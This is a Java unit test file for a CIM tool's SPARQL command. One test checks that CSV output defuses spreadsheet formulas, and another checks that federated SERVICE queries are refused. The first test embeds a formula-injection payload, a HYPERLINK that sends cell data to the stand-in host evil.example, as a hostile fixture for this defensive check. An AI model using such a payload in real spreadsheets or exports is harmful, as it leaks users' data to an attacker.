/*
 * Copyright (c) 2020-2026 gridDigIt Kft.
 * Licensed under the EUPL-1.2-or-later.
 * SPDX-License-Identifier: EUPL-1.2+
 */
package eu.griddigit.CimPal.cli.command;

import eu.griddigit.CimPal.cli.CimPalCli;
import eu.griddigit.CimPal.cli.ExitCode;
import eu.griddigit.cimpal.core.testsupport.StubHttpServer;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;

import static org.assertj.core.api.Assertions.assertThat;

/** {@code sparql} must not send SERVICE requests (SEC-2, gap G3), wherever it is called from. */
class SparqlCommandTest {

    @TempDir
    Path tempDir;

    @Test
    void csvOutputNeutralisesFormulaCells() throws Exception {
        // A model value that a spreadsheet would run as a formula (SEC-5, attestation finding 4).
        Path model = Files.writeString(tempDir.resolve("m.ttl"),
                "<urn:a> <urn:p> \"=HYPERLINK(\\\"https://evil.example/?d=\\\"&A1,\\\"ok\\\")\" .\n");
        Path csv = tempDir.resolve("out.csv");
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        PrintStream origOut = System.out;
        System.setOut(new PrintStream(out, true, StandardCharsets.UTF_8));
        try {
            int exit = CimPalCli.inProcess().execute("sparql", "--models", model.toString(),
                    "--query", "SELECT ?o WHERE { ?s ?p ?o }", "--format", "csv");
            assertThat(exit).isEqualTo(ExitCode.OK);
            assertThat(CimPalCli.inProcess().execute("sparql", "--models", model.toString(),
                    "--query", "SELECT ?o WHERE { ?s ?p ?o }", "--output", csv.toString())).isEqualTo(ExitCode.OK);
        } finally {
            System.setOut(origOut);
        }

        for (String text : new String[] {out.toString(StandardCharsets.UTF_8), Files.readString(csv)}) {
            String cell = text.lines().skip(1).findFirst().orElseThrow();
            assertThat(cell.startsWith("\"") ? cell.substring(1) : cell).as(text).startsWith("'=HYPERLINK");
        }
    }

    @Test
    void serviceQueryIsRefusedWithExit2AndNoRequestIsSent() throws Exception {
        Path model = Files.writeString(tempDir.resolve("m.ttl"), "<urn:a> <urn:p> \"x\" .\n");
        String results = "{\"head\":{\"vars\":[\"s\"]},\"results\":{\"bindings\":[]}}";
        ByteArrayOutputStream err = new ByteArrayOutputStream();
        PrintStream origErr = System.err;
        try (StubHttpServer stub = StubHttpServer.start().serve("/sparql", results, "application/sparql-results+json")) {
            String query = "SELECT * WHERE { SERVICE <" + stub.uri("/sparql") + "> { ?s ?p ?o } }";
            System.setErr(new PrintStream(err, true, StandardCharsets.UTF_8));
            int exit;
            try {
                exit = CimPalCli.inProcess().execute("sparql", "--models", model.toString(), "--query", query,
                        "--format", "json");
            } finally {
                System.setErr(origErr);
            }

            assertThat(exit).isEqualTo(ExitCode.INVALID_INPUT);
            assertThat(stub.requests()).isEmpty();
            // The refusal itself, not some other bad-input error that merely echoes the query.
            assertThat(err.toString(StandardCharsets.UTF_8))
                    .contains("SPARQL SERVICE (federated query) is not allowed")
                    .doesNotContain("Illegal char").doesNotContain("\tat ");
        }
    }
}
